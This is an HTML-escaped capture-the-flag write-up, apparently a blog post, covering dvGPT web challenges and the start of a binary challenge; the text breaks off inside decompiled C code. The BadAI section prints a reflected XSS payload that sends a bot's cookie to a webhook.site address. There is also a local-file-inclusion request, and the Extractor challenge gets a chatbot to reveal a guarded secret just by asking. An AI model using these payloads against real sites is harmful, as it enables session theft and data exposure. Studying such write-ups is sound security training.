&lt;p&gt;&lt;a href=&#34;#1-dvgpt&#34;&gt;&lt;code&gt;dvGPT&lt;/code&gt; (Web Exploitation)&lt;/a&gt; - 4 challenges&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#2-corruption&#34;&gt;&lt;code&gt;Corruption&lt;/code&gt; (Rev/Binary Exploitation)&lt;/a&gt; - 4 challenges&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#3-triage&#34;&gt;&lt;code&gt;Triage&lt;/code&gt; (Cryptography/Forensics)&lt;/a&gt; - 4 challenges&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#4-range--zz-king-of-the-hill&#34;&gt;&lt;code&gt;Range &amp;amp; King of The Hill&lt;/code&gt; (Machines/Attack Defense)&lt;/a&gt; - 4 challenges + 8 Attack Defense Flags&lt;/p&gt;
&lt;h1 id=&#34;1-dvgpt&#34;&gt;1. dvGPT&lt;/h1&gt;
&lt;p&gt;This category contained 4 web challenges, all based on the same website, hosting chatbot similar to chatGPT, which was quite interesting and fun!&lt;/p&gt;
&lt;h2 id=&#34;leaky-75&#34;&gt;Leaky (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;People leave dumb comments about vulnerabilities all over client-side code&amp;hellip; most modern web applications don&amp;rsquo;t display all the possible code at once though, for a variety of reasons.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a link to a website, which hosts an AI similar to chatGPT. The description hints at &amp;lsquo;client-side code&amp;rsquo; so we inspect element, and find the flag in a javascript file in 2 parts.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;intro-window&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag{the_DOM_is_like_&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              , &lt;span style=&#34;color:#a6e22e&#34;&gt;Z&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;P&lt;/span&gt;((()=&amp;gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;o&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;)(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;div&amp;#34;&lt;/span&gt;, {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tag&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;It&amp;#39;s a dumpster fire.&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              , &lt;span style=&#34;color:#a6e22e&#34;&gt;z&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chats&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;crazy_virtual_maaaan}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Flag: &lt;code&gt;flag{the_DOM_is_like_crazy_virtual_maaaan}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;extractor-100&#34;&gt;Extractor (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;We gave dvGPT a flag and for some reason trust it to keep it safe. These AIs are super duper secure my dude.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sounds like prompt engineering. We simply ask for the flag, in words I guess.&lt;/p&gt;

  &lt;img src=&#34;./img/web1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Flag: `flag{hey_you&amp;rsquo;re_not_robert}&lt;/p&gt;
&lt;h2 id=&#34;badml-125&#34;&gt;BadML (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Where does all this data come from? Have you found all the app endpoints?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The flag is located at ./flag.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Lets look around the website. Using burpsuite, we can find what resources the website requests and loads, and upon some digging we find it sends a get request to &lt;code&gt;/footer?message=default&lt;/code&gt; to get the footer message.&lt;/p&gt;

  &lt;img src=&#34;./img/web2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Seems like &lt;code&gt;default&lt;/code&gt; is some sort of file containing the footer message, what if we try &lt;code&gt;flag.txt&lt;/code&gt; instead?&lt;/p&gt;

  &lt;img src=&#34;./img/web3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;And we get the flag: &lt;code&gt;flag{LFI_LetsgoFindIt}&lt;/code&gt;. Note that you don&amp;rsquo;t need to use burpsuite repeater - visiting &lt;code&gt;/footer?message=flag.txt&lt;/code&gt; works too.&lt;/p&gt;
&lt;h2 id=&#34;badai-150&#34;&gt;BadAI (150)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;So we have this guy named Bill that works here&amp;ndash;he handles the support tickets for dvGPT. If you have any problems let us know and Bill will check it out. Bill does nothing but stare at the ticket feed, so you can expect him to check your request within a couple seconds.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Bill can only view pages from dvGPT though, so don&amp;rsquo;t bother sending him anything else.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The flag is stored in a cookie in Bill&amp;rsquo;s browser.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ndash; If you think you&amp;rsquo;re close feel free to DM me (Nate) and I will help you depending on what you&amp;rsquo;re asking and how close you are. There are some browser nuances you might not be aware of and if you are 99% of the way there we&amp;rsquo;ll probably give it to you.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Every part of the description hints to this being an &lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting&#34;&gt;XSS&lt;/a&gt; challenge - almost every time when the goal is to steal a bot&amp;rsquo;s cookie, it is done through XSS.&lt;/p&gt;

  &lt;img src=&#34;./img/web4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Looking around the site again, we find a place to submit a form - to Bill (the bot). However, as the description says, &lt;code&gt;Bill can only view pages from dvGPT&lt;/code&gt;, so we need to find an XSS somewhere in the dvGPT site. An interesting thing is that visiting any invalid page returns a status code of 200 - along with our text! We can indeed inject arbitary code and gain reflected XSS in here.&lt;/p&gt;

  &lt;img src=&#34;./img/web5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;So now we need to come up with a payload. There are already many payloads to steal cookies online by sending a GET request to a webhook with the cookie as a parameter, but after some experimenting around this seemed to work.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://wtashuxsyj.final.hackabit.com/&amp;lt;script&amp;gt;document.location=atob(&#39;aHR0cHM6Ly93ZWJob29rLnNpdGUvMTI2YzhiNjUtOTJiYi00ZDg4LWFhYmQtYmYxNDkxMmE4OTEwLz9hPQ==&#39;)+btoa(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It simply executes javascript which redirects the bot to my &lt;a href=&#34;https://webhook.site/&#34;&gt;online webhook&lt;/a&gt; with the base64 encoded cookie as a parameter.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://webhook.site/126c8b65-92bb-4d88-aabd-bf14912a8910/?a=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;btoa&lt;/span&gt;(document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I base64 encoded the webhook url as the &lt;code&gt;?&lt;/code&gt; character would confuse the URL string into thinking it was a parameter for the main site&amp;rsquo;s url (&lt;code&gt;wtashuxsyj.final.hackabit.com&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Checking the webhook we get the flag: &lt;code&gt;flag{mirroring_to_the_max}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/web6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h1 id=&#34;2-corruption&#34;&gt;2. Corruption&lt;/h1&gt;
&lt;p&gt;This category contained 4 challenges based on binaries - reverse engineering and binary exploitation were needed to solve all 4! Also, all the challenges used the same binary&amp;hellip;&lt;/p&gt;
&lt;h2 id=&#34;santa-75&#34;&gt;Santa (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;You all asked for it so here it is, an intro to binary exploitation!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s get started nice and simple, baby steps to reverse engineering (RE).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;All challenges in this section use the same binary. The target is x86 and ASLR is on but it shouldn&amp;rsquo;t be relevant to any of your exploits.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We get a binary file. We can simply strings grep the file to get the flag - not much reverse engineering involved, I guess. Flag: &lt;code&gt;flag{baby_steps_gift_just_for_you}&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uwuteddy@DESKTOP-5BVRVO8:~$ strings corruption |grep -i flag
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;baby_steps_gift_just_for_you&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag_function
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;controller_flag
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;coredump-100&#34;&gt;Coredump (100)&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Now that we have at least inspected the binary, lets go a bit deeper. You can&amp;rsquo;t just overflow the buffer with a bunch of A&amp;rsquo;s&amp;ndash;reverse engineer the software and figure out your payload format. Smash the stack to get the flag, no control necessary yet. Once you have a working exploit, fire it against the remote target to get the real flag.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;From the description: smash the stack, no control necessary &lt;em&gt;yet&lt;/em&gt;. Upon running the binary locally, and smashing the stack by sending a bunch of characters, nothing really happens. Decompiling the binary &lt;a href=&#34;https://dogbolt.org/?id=a1a87852-0a8c-451d-a408-efcc14a3d4a9&#34;&gt;online&lt;/a&gt; we see what is going on - it seems like these flags are loaded from environment variables, which are of course, not set locally.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag_function&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v0; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getenv&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HAB_BITSANDBYTES&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(v0);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fflush&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//----- (08049264) --------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;controller_flag&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v0; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getenv&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HAB_CONTROLLER&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(v0);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fflush&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Additionally, we can see the main function of the program.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;envp)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;size_t&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; s[&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+0h] [ebp-236h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; dest[&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+1F4h] [ebp-42h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;s2; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+226h] [ebp-10h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v9; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+22Ah] [ebp-Ch]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;p_argc; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+22Eh] [ebp-8h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  p_argc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;argc;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  s2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UNLOCK&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You might need this: %p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, flag_function);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;this might help too: %p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Talk to me Maverick: &amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;fflush&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;fgets&lt;/span&gt;(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;, stdin);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;fflush&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;(s2);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strncmp&lt;/span&gt;(s, s2, v3) )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Copying into the destination now...&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;fflush&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;memcpy&lt;/span&gt;(dest, s, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3Cu&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v9 )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getenv&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HAB_COREDUMP&amp;#34;&lt;/span&gt;);
